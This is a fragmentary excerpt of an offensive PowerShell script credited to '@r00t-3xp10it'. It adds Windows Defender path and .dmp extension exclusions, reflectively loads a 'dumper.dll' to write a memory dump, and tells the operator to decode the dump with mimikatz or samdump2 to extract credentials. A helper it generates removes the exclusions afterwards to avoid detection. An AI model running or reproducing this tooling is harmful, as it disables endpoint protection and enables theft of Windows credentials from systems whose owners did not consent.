...
.DESCRIPTION
   ...
   and extension (.dmp) exclusions. Then removes folder and 
...
.OUTPUTS
   ...
   * Done - TimeLapse: 00:52:14 - Decode with mim[i]ka[t]z\samdump2 ..
     Remark: Delete EyxctR.dmp from %tmp% to remove all exclusions ..
...
If([bool](Get-Service -Name "WinDefend") -iMatch 'True')
{
   ...
   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch 'True')
   {
      ...
      write-host "`nGAC    Version        Location"
      write-host "---    -------        --------"
      write-host "False  v4.0.30319"

      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\dumper.dll"))|Out-Null
      Start-Sleep -Milliseconds $Delay;[dumper.Program]::Main("$pwd\$RandName.dmp")|Out-Null
...
If($FExclusion -iMatch 'True')
{
   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -iMatch 'True')
   {
      ...
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Delete Windows Defender extension exclusion

      .NOTES
         This function create DeleteExclusions.ps1 script that
         waits for dump.dmp file to be manual deleted to remove
         the Windows Defender extension (.dmp) exclusion. Or else
         everytime we manipulate dump.dmp will trigger detection.
      #>
      ...
      echo "       break" >> DeleteExclusions.ps1
      echo "    }" >> DeleteExclusions.ps1
      echo "}" >> DeleteExclusions.ps1
      echo "Remove-Item -Path `$MyInvocation.MyCommand.Source" >> DeleteExclusions.ps1
      ...
      write-host "  Remark: Delete $RandName.dmp from %tmp% to remove all exclusions .." -ForegroundColor Blue
